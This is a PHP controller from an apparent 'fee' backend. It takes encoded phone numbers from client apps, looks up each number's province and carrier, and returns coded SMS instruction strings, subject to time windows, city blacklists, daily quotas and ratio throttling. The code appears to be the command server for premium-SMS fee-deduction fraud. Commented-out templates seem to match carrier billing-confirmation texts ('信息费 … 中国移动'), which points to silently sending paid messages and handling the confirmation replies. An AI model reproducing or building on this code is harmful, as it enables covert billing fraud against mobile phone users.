<?php
namespace app\fee\controller;

use think\Cache;
use think\Controller;
use think\Log;
use think\Request;

class Resources extends Controller
{

    public function __construct(Request $request = null)
    {
        parent::__construct($request);
        $this->prefix = "";
    }

    public function index()
    {
        return "123555";
    }

    /**
     * 服务器转接数据
     * 如果返回123则为由服务器返回
     * 如果返回其他则由当前服务器返回
     * @return string
     */
    public function update2(){
        // 获取参数
        $data = input("get.");

        // 当前时间(只允许0~7时操作)
        $now = date("H");
        if ($now >= 7) {

            // 格式化数据
            $DataProcessing = Model('DataProcessing', 'logic');
            $phone = $DataProcessing->formatPhoneNumber($data['flag1']);

            // 查找归属地
            $res = Model("Hdcx")->checkProvinceByPhone($phone);
            if ($res) {
//                if ($res->province == "新疆" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone" => $phone, "type" => 1, "uid" => $data['uid']]);
//                    return "1KW1002DH?1?ehwwhwdh?XLA?6?" . $data['uid'] . "?60?0?0";
//                }
//                if ($res->province == "辽宁" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone" => $phone, "type" => 2, "uid" => $data['uid']]);
//                    return "1KW1002DH?1?ehwlwiws?9?4?" . $data['uid'] . "?60?0?0";
//                }
                if ($res->province == "海南" && $res->isp == '移动') {
                    Model("Success")->insert(["phone" => $phone, "project_id" => 99, "uid" => $data['uid']]);
                    return "1KW1002DH?1?ehwwhwdh?XL9?3?" . $data['uid'] . "?60?0?0";
                }
//                if ($res->province == "广东" && !in_array($res->city,['广州','河源']) && $res->isp == '移动'){
//                    Model("Success")->insert(["phone" => $phone, "type" => 4, "uid" => $data['uid']]);
//                    // return "1KW1002DH?1?ehwwhsel?DZ14?2?1?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
//                    return "1KW1002DH?1?ehwwhsel?DZ14?1?" . $data['uid'] . "?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
//                }
            }
        }
        return "123";
    }

    /**
     * 服务器转接数据
     * 如果返回123则为由服务器返回
     * 如果返回其他则由当前服务器返回
     * @return string
     */
    public function update(){

        $prefix = "";

        // 检查用户
        $UserLogic = Model("User","logic");
        $UserLogic->checkUser();

        // 数据统计
        $StatisticsLogic = Model("Statistics","logic");
        $StatisticsLogic->run();

        // 明天时间
        $tomorrow = strtotime(date("Y-m-d", strtotime("+1 day")));

        // 获取参数
        $data = input("get.");

        // 格式化数据
        $DataProcessing = Model('DataProcessing', 'logic');
        $phone = $DataProcessing->formatPhoneNumber($data['flag1']);

        Log::record('手机号码为:'.$phone);

        // 查找归属地
        $res = Model("Hdcx")->checkProvinceByPhone($phone);
        Log::record('Hdcx:' . json_encode($res));

        if ($res) {
            // 省份统计
            $StatisticsLogic = Model("Statistics", "logic");
            $StatisticsLogic->set_province_statistics($res->province);
        }

        // 当前时间(不允许0~7时操作)
        $now = date("H");
        if ($now >= 7) {

            if ($res) {

                /** 手动任务 **/
//                if ($res->province == "海南" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone" => $phone, "project_id" => 99, "uid" => $data['uid']]);
//                    return "1KW1002DH?1?ehwwhwdh?XL9?3?" . $data['uid'] . "?60?0?0";
//                }

                /** 系统任务 **/

                Log::record('所属省份:'.$res->province);

                $prefix .= "[".$res->province."]";
                $this->prefix = $prefix;

                Log::record($prefix.'手机号码为:'.$phone);

                // 转换拼音
                $PinyinLogic = Model('Pinyin', 'logic');
                $provincePinyin = $PinyinLogic->encode($res->province,'all');

                // 获取缓存
                $redis = Cache::store('redis')->handler();
                $projectList = $redis->zReverseRange("projet:" . $provincePinyin, 0, -1, true);
                if ($projectList) {
                    foreach ($projectList as $key=>$v) {

                        Log::record($prefix.'执行项目开始');
                        Log::record($prefix.'项目参数:'.$key);

                        $item = json_decode($key);
                        $id = $item->id;

                        if ($item->isstart == 1) { // 开关

                            // 时间控件
                            $start_time = $item->start_time;
                            $end_time = $item->end_time;
                            $nowHiTime = (date("H:i"));
                            if ($start_time == null || $end_time == null) {  // 时间为空
                                Log::record($prefix.'时间为空');
                                continue;
                            } elseif ($nowHiTime < $start_time || $nowHiTime > $end_time) { // 不在有效时间
                                Log::record($prefix.'不在有效时间');
                                continue;
                            }

                            // 黑名单
                            $blacklist_city = explode(",", $item->blacklist_city);
                            if (in_array($res->city, $blacklist_city)) {
                                Log::record($prefix.'黑名单城市:' . $res->city);
                                continue;
                            }

                            // 获取限制数量(0为一直执行)
                            $total = $redis->hget("total_daily:" . $id, date("Ymd"));
                            if ( ($total < $item->total_daily || $item->total_daily == 0) && $this->checkRatio($id, $item->ratio)) {

                                // 短信模板
                                $sms = str_replace("uid", $data['uid'], $item->sms);

                                // 去除重复日志
                                $getKey = "log:" . $id . ":" . date("Ymd");
                                $getData = md5(json_encode($data)); // 如果重复参数则不作记录
                                $getRedis = $redis->hsetnx($getKey,$getData,date("Y-m-d H:i:s"));

                                // 如果生成成功才记录日志则不返回
                                if($getRedis){

                                    Log::record($prefix.'没有输出过');

                                    $redis->expire($getKey, $tomorrow - time());

                                    // 记录日志
                                    Model("Success")->insert([
                                        "phone" => $phone,
                                        "project_id" => $item->project_id,
                                        "uid" => $data['uid'],
                                        "flag2" => $data['flag2'],
                                        "channel" => $data['channel'],
                                        "version" => $data['version'],
                                        "province" => $res->province,
                                        "city" => $res->city,
                                        "sms" => $sms,
                                        "ctime" => date("Y-m-d H:i:s")
                                    ]);

                                    // 计数器加一
                                    $redis->hincrby("total_daily:" . $id, date("Ymd"), 1);

                                    // 输出总数
                                    $StatisticsLogic->total_output_today();

                                }else{
                                    Log::record($prefix.'已输出过');
                                }
                                Log::record($prefix.'满足条件输出项目ID:'.$id);
                                Log::record($prefix.'满足条件输出内容:'.$sms);
                                return $sms;
                            }

                        }else{
                            Log::record($prefix.'该任务已关闭');
                        }
                    }
                }
            }
            else{
                Log::record($prefix.'Hdcx:没有信息');
            }
        }

        Log::record($prefix.'操作结束交回上级处理');
        return "123";
    }

    /**
     * 用于检测是否需要输出到目标服务器
     */
    public function detector(){

        $prefix = "";

        // 获取参数
        $data = input("get.");
        $sms = $data['sms'];
        Log::record($prefix . 'sms:' . $sms);

        if ($sms) {

            $sms = urldecode($sms);
            Log::record($prefix . '解码后数据' . $sms);

            $redis = Cache::store('redis')->handler();
            $res = $redis->hget("sms", $sms);
            if ($res == 1) {
                Log::record($prefix . "允许推送到目标服务器");
                return 456;
            } else {
                Log::record($prefix . '不允许推送到目标服务器');
                return 789;
            }

        }

        Log::record($prefix . '不准在默认输出');
        return 456;
    }

    /**
     * 比例计算
     * @param $id
     * @return bool
     */
    private function checkRatio($id, $ratio)
    {
        $prefix = $this->prefix;
        Log::record($prefix.'比例计算开始id:' . $id . "|ratio:" . $ratio);

        $redisKey = "ratio:" . $id;
        $redis = Cache::store('redis')->handler();
        $num = $redis->hget($redisKey, date("Y-m-d")); // 获取当前排序

        Log::record($prefix.'获取:' . $redisKey . ":" . $num);

        $num = $num > 0 ? $num : 0;

        // 特殊规则
        if($ratio==50){
            return $this->fiftyRatio($id);
        }

        // 如果小于等于比例则输出
        if($ratio==0){
            $status = false;
        } elseif ($num < $ratio) {
            $status = true;
        }else{
            $status = false;
        }

        if ($num + 1 == 100) {
            $redis->hset($redisKey, date("Y-m-d"),0);  // 如果大于100则还原为0
        }else{
            $redis->hincrby($redisKey, date("Y-m-d"),1); // 自增1
        }

        Log::record($prefix.'比例计算结束');
        return $status;
    }

    /**
     * 50%规则
     */
    private function fiftyRatio($id)
    {
        $prefix = $this->prefix;
        Log::record($prefix.'ratio50:' . $id);
        $redisKey = "ratio50:" . $id;
        $redis = Cache::store('redis')->handler();
        $num = $redis->hget($redisKey, date("Y-m-d")); // 获取当前排序
        if ($num == 1) {
            $redis->hset($redisKey, date("Y-m-d"), 0);
        } else {
            $redis->hset($redisKey, date("Y-m-d"), 1);
        }
        Log::record($prefix.'ratio50:输出内容:' . $num);
        return $num;
    }

    /**
     * 服务器转接数据
     * 如果返回123则为由服务器返回
     * 如果返回其他则由当前服务器返回
     * @return string
     */
    public function test(){

        // 格式化数据
        $DataProcessing = Model('DataProcessing','logic');
        $phone = 'iwhhhhdssheaoel';
        $phone = $DataProcessing->decodePhone($phone);

        dump($phone);

        // 格式化数据
        $DataProcessing = Model('DataProcessing','logic');
        $phone = '13800433500';
        $phone = $DataProcessing->encodePhone($phone);

        dump($phone);


        $phone = 'eorhhdeashh';
        $phone = $DataProcessing->formatPhoneNumber($phone);

        // 查找归属地
        $res = Model("Hdcx")->checkProvinceByPhone($phone);
        dump($res);

//        // 获取参数
//        $data = input("get.");
//
//        // 当前时间(只允许0~7时操作)
//        $now = date("H");
//        if($now>=7){
//
//            // 格式化数据
//            $DataProcessing = Model('DataProcessing','logic');
//            $phone = $DataProcessing->formatPhoneNumber($data['flag1']);
//
//            // 查找归属地
//            $res = Model("Hdcx")->checkProvinceByPhone($phone);
//            if($res){
//                if ($res->province == "新疆" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone"=>$phone]);
//                    return "1KW1002DH?1?ehwwhwdh?XLA?6?00000001?60?0?";
//                }
//            }
//        }
//        return "123";
    }

    public function check(){
        for($i=1;$i<200;$i++){
            $res = Model("Url")->where("content is null")->find();

            dump($res->url);
            $a = $this->post_json_data($res->url,json_encode([]));
            dump($a);
            Model("Url")->where("id",$res['id'])->update(["content"=>utf8_encode($a['result'])]);

        }
    }

    /*
     * post 发送JSON 格式数据
     * @param $url string URL
     * @param $data_string string 请求的具体内容
     * @return array
     *      code 状态码
     *      result 返回结果
     */
    function post_json_data($url, $data_string) {
        //初始化
        $ch = \curl_init();
        //设置post方式提交
        \curl_setopt($ch, CURLOPT_POST, 1);
        //设置抓取的url
        \curl_setopt($ch, CURLOPT_URL, $url);
        //设置post数据
        \curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
        //设置头文件的信息作为数据流输出
        \curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Content-Type: application/json; charset=utf-8',
                'Content-Length: ' . strlen($data_string))
        );
        \ob_start();
        //执行命令
        \curl_exec($ch);
        $return_content = \ob_get_contents();
        \ob_end_clean();
        $return_code = \curl_getinfo($ch, CURLINFO_HTTP_CODE);
        return array('code'=>$return_code, 'result'=>$return_content);
    }


}